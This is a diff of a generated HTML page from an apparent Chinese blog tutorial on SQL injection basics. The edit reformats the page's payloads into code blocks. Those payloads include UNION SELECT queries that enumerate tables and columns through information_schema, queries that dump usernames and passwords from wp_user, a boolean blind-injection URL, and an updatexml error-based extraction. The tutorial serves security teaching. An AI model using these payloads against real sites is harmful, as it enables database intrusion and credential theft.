@@ -27,7 +27,7 @@
 <meta property="og:description" content="SQL注入–基础篇 SQL注入基础对用户参数过滤不严格导致输入数据可以影响预设查询功能的导致数据库被入侵的一种技术 SQL注入技巧 判断列数:order by 5 --+  闭合符号的判断数字型注入id&#x3D;1 and 1&#x3D;2   判断是否是数字型,如果通过无闭合符号 字符型注入 1&#39; and &#39;1&#39;&#x3D;&#39;1  ，1&#39; and &#39;1&#39;&#x3D;&#39;2">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2025-09-13T13:49:27.000Z">
-<meta property="article:modified_time" content="2025-09-13T14:01:20.809Z">
+<meta property="article:modified_time" content="2025-09-13T14:49:17.112Z">
 <meta property="article:author" content="ziddzide">
 <meta property="article:tag" content="SQL注入">
 <meta name="twitter:card" content="summary_large_image">
@@ -297,8 +297,17 @@
 <p><strong>破解表名·字段</strong>：<code>table_name</code>–表名</p>
 <p>                            <code>table_schema</code>–数据库名</p>
 <p>                            <code>information_schema</code>–所有表名,字段,数据库</p>
-<p>因此<strong>查询表名</strong><br>    union select 1,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database())</p>
-<p>        <strong>查询字段</strong>:<br>    union select 1,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;’wp_users’)</p>
+<p>因此<strong>查询表名</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>database())<br></code></pre></td></tr></table></figure>
+
+
+
+<p>        <strong>查询字段</strong>:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;wp_users&#x27;</span>)<br></code></pre></td></tr></table></figure>
+
+
+
+
 <p><strong>附言</strong>:<code>limit1,1</code>限制查询手段,取查询结果中第一条数据之后的第一条数据</p>
 <h3 id="字符型注入和布尔盲注"><a href="#字符型注入和布尔盲注" class="headerlink" title="字符型注入和布尔盲注"></a>字符型注入和布尔盲注</h3><h4 id="字符型-判断手段"><a href="#字符型-判断手段" class="headerlink" title="字符型 判断手段"></a>字符型 判断手段</h4><p>在url中改变<code>id=3-1</code>无效,但是改变为<code>id=2a</code>有效时,SQL强制将<code>2a</code>转换为<code>2</code>,<code>a</code>被强制转换为<code>0</code></p>
 <h4 id="字符型-利用方式"><a href="#字符型-利用方式" class="headerlink" title="字符型 利用方式"></a>字符型 利用方式</h4><p>在url中用单引号闭合前面的单引号,再用#(<code>%23</code>或<code>--%20</code>)去注释掉后面的语句,但是所用格式应该要是url编码</p>
@@ -306,13 +315,23 @@
 <p>空格–<code>%20</code></p>
 <p>单引号–<code>%27</code></p>
 <p>#–<code>%23</code></p>
-<p>查询语句<br>    %27 union select 1,group_concat(concat(user,0x7e,pwd)) from wp_user limit 1,1%23–+</p>
-<p>但这样只会输出单一数据,如果想要输出完整数据:<br>    union select 1,group_concat(concat(username,0x7e,password)) from database_name.tablename –+</p>
+<p>查询语句</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">%</span><span class="hljs-number">27</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(concat(<span class="hljs-keyword">user</span>,<span class="hljs-number">0x7e</span>,pwd)) <span class="hljs-keyword">from</span> wp_user limit <span class="hljs-number">1</span>,<span class="hljs-number">1</span><span class="hljs-operator">%</span><span class="hljs-number">23</span><span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>
+
+<p>但这样只会输出单一数据,如果想要输出完整数据:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(concat(username,<span class="hljs-number">0x7e</span>,password)) <span class="hljs-keyword">from</span> database_name.tablename <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>
+
+
+
 <h4 id="布尔盲注技术"><a href="#布尔盲注技术" class="headerlink" title="布尔盲注技术"></a>布尔盲注技术</h4><p><strong>单一字符</strong>:通过<code>and</code>逻辑运算符连接<code>id=1&#39; and &#39;f&#39;&lt;&#39;n&#39;</code> 前者为真,所以判断后者即可,利用二分完成</p>
-<p><strong>长数据</strong>:利用<code>mid(),substring(),substr()</code>函数进行操作即可.<br>    实际案例:<a href="http://example.com/example.php?id=1">http://example.com/example.php?id=1</a>‘ and(select(mid(select concat(user,0x7e,pwd) from wp_user),1,1)) &#x3D; ‘a’<br>    #其中的第一个1表示数据的第一位,判断是否第一位是a</p>
+<p><strong>长数据</strong>:利用<code>mid(),substring(),substr()</code>函数进行操作即可.<br>    实际案例:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html">http://example.com/example.php?id=1&#x27; and(select(mid(select concat(user,0x7e,pwd) from wp_user),1,1)) = &#x27;a&#x27;<br>#其中的第一个1表示数据的第一位,判断是否第一位是a<br></code></pre></td></tr></table></figure>
+
 <h4 id="时间盲注技术"><a href="#时间盲注技术" class="headerlink" title="时间盲注技术"></a>时间盲注技术</h4><p>其本质与布尔盲注一致</p>
 <h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>为了方便调试,有的网站会开启错误调试信息,只要利用注入手段让页面上显示错误信息,内容是执行sql语句后的结果</p>
-<p><strong>实际案例:</strong><br>    id &#x3D; 1’ or updatexml(1,concat(0x7e,(select pwd from wp_user)),1)%23</p>
+<p><strong>实际案例:</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id <span class="hljs-operator">=</span> <span class="hljs-number">1</span><span class="hljs-string">&#x27; or updatexml(1,concat(0x7e,(select pwd from wp_user)),1)%23</span><br></code></pre></td></tr></table></figure>
+
 <hr>
 <h2 id="SQL注入点"><a href="#SQL注入点" class="headerlink" title="SQL注入点"></a>SQL注入点</h2><ul>
 <li><p>select_expr:常用于页面展示,例如新闻内容</p>
